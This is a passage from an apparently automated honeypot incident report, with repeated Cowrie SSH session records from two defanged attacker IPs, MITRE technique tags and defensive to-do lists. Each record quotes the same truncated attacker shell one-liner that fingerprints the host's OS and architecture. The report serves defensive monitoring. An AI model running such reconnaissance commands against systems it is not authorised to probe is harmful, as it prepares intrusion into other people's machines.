| `2026-08-02 04:30:55` | `cowrie.session.connect` |
| `2026-08-02 04:30:57` | `cowrie.client.version` |
| `2026-08-02 04:30:57` | `cowrie.client.kex` |
| `2026-08-02 04:31:01` | `cowrie.login.success` |
| `2026-08-02 04:31:04` | `cowrie.session.params` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.success` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.command.input` |
| `2026-08-02 04:31:04` | `cowrie.log.closed` |
| `2026-08-02 04:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93068d91a6d0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:31 |
| **Last Seen** | 2026-08-02 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:31:52` | `cowrie.session.connect` |
| `2026-08-02 04:31:52` | `cowrie.client.version` |
| `2026-08-02 04:31:53` | `cowrie.client.kex` |
| `2026-08-02 04:31:53` | `cowrie.login.success` |
| `2026-08-02 04:31:54` | `cowrie.session.params` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.success` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.command.input` |
| `2026-08-02 04:31:54` | `cowrie.log.closed` |
| `2026-08-02 04:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416dd1d857b8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:32 |
| **Last Seen** | 2026-08-02 04:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:32:54` | `cowrie.session.connect` |
| `2026-08-02 04:32:55` | `cowrie.client.version` |
| `2026-08-02 04:32:55` | `cowrie.client.kex` |
| `2026-08-02 04:32:57` | `cowrie.login.success` |
| `2026-08-02 04:32:58` | `cowrie.session.params` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.success` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:58` | `cowrie.command.input` |
| `2026-08-02 04:32:59` | `cowrie.log.closed` |
| `2026-08-02 04:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc87487e5d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:33 |
| **Last Seen** | 2026-08-02 04:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:33:20` | `cowrie.session.connect` |
| `2026-08-02 04:33:21` | `cowrie.client.version` |
| `2026-08-02 04:33:21` | `cowrie.client.kex` |
| `2026-08-02 04:33:24` | `cowrie.login.success` |
| `2026-08-02 04:33:26` | `cowrie.session.params` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.success` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:26` | `cowrie.command.input` |
| `2026-08-02 04:33:27` | `cowrie.log.closed` |
| `2026-08-02 04:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59dfee7367b1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:33 |
| **Last Seen** | 2026-08-02 04:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:33:54` | `cowrie.session.connect` |
| `2026-08-02 04:33:54` | `cowrie.client.version` |
| `2026-08-02 04:33:54` | `cowrie.client.kex` |
| `2026-08-02 04:33:56` | `cowrie.login.success` |
| `2026-08-02 04:33:57` | `cowrie.session.params` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.success` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:57` | `cowrie.command.input` |
| `2026-08-02 04:33:58` | `cowrie.log.closed` |
| `2026-08-02 04:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50064e446d06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:34 |
| **Last Seen** | 2026-08-02 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:34:57` | `cowrie.session.connect` |
| `2026-08-02 04:34:57` | `cowrie.client.version` |
| `2026-08-02 04:34:57` | `cowrie.client.kex` |
| `2026-08-02 04:34:59` | `cowrie.login.success` |
| `2026-08-02 04:35:00` | `cowrie.session.params` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.success` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.command.input` |
| `2026-08-02 04:35:00` | `cowrie.log.closed` |
| `2026-08-02 04:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4a8460beb9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:35 |
| **Last Seen** | 2026-08-02 04:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:35:56` | `cowrie.session.connect` |
| `2026-08-02 04:35:57` | `cowrie.client.version` |
| `2026-08-02 04:35:57` | `cowrie.client.kex` |
| `2026-08-02 04:36:01` | `cowrie.login.success` |
| `2026-08-02 04:36:04` | `cowrie.session.params` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.success` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.command.input` |
| `2026-08-02 04:36:04` | `cowrie.log.closed` |
| `2026-08-02 04:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa33afa2a22

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:36 |
| **Last Seen** | 2026-08-02 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:36:06` | `cowrie.session.connect` |
| `2026-08-02 04:36:06` | `cowrie.client.version` |
| `2026-08-02 04:36:07` | `cowrie.client.kex` |
| `2026-08-02 04:36:07` | `cowrie.login.success` |
| `2026-08-02 04:36:08` | `cowrie.session.params` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.success` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:08` | `cowrie.command.input` |
| `2026-08-02 04:36:09` | `cowrie.log.closed` |
| `2026-08-02 04:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2230802f3f83

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:37 |
| **Last Seen** | 2026-08-02 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:37:24` | `cowrie.session.connect` |
| `2026-08-02 04:37:24` | `cowrie.client.version` |
| `2026-08-02 04:37:24` | `cowrie.client.kex` |
| `2026-08-02 04:37:25` | `cowrie.login.success` |
| `2026-08-02 04:37:26` | `cowrie.session.params` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.success` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.command.input` |
| `2026-08-02 04:37:26` | `cowrie.log.closed` |
| `2026-08-02 04:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2f9bfb8c7a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:38 |
| **Last Seen** | 2026-08-02 04:39 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:38:52` | `cowrie.session.connect` |
| `2026-08-02 04:38:53` | `cowrie.client.version` |
| `2026-08-02 04:38:53` | `cowrie.client.kex` |
| `2026-08-02 04:39:02` | `cowrie.login.success` |
| `2026-08-02 04:39:03` | `cowrie.session.params` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.success` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:03` | `cowrie.command.input` |
| `2026-08-02 04:39:04` | `cowrie.command.input` |
| `2026-08-02 04:39:04` | `cowrie.command.input` |
| `2026-08-02 04:39:04` | `cowrie.log.closed` |
| `2026-08-02 04:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd922a89434f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:38 |
| **Last Seen** | 2026-08-02 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:38:54` | `cowrie.session.connect` |
| `2026-08-02 04:38:54` | `cowrie.client.version` |
| `2026-08-02 04:38:54` | `cowrie.client.kex` |
| `2026-08-02 04:38:55` | `cowrie.login.success` |
| `2026-08-02 04:38:56` | `cowrie.session.params` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.success` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.command.input` |
| `2026-08-02 04:38:56` | `cowrie.log.closed` |
| `2026-08-02 04:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3bc8c21ed3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:40 |
| **Last Seen** | 2026-08-02 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:40:44` | `cowrie.session.connect` |
| `2026-08-02 04:40:44` | `cowrie.client.version` |
| `2026-08-02 04:40:44` | `cowrie.client.kex` |
| `2026-08-02 04:40:45` | `cowrie.login.success` |
| `2026-08-02 04:40:46` | `cowrie.session.params` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.success` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.command.input` |
| `2026-08-02 04:40:46` | `cowrie.log.closed` |
| `2026-08-02 04:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d764ae70b7de

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:41 |
| **Last Seen** | 2026-08-02 04:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:41:44` | `cowrie.session.connect` |
| `2026-08-02 04:41:45` | `cowrie.client.version` |
| `2026-08-02 04:41:46` | `cowrie.client.kex` |
| `2026-08-02 04:41:50` | `cowrie.login.success` |
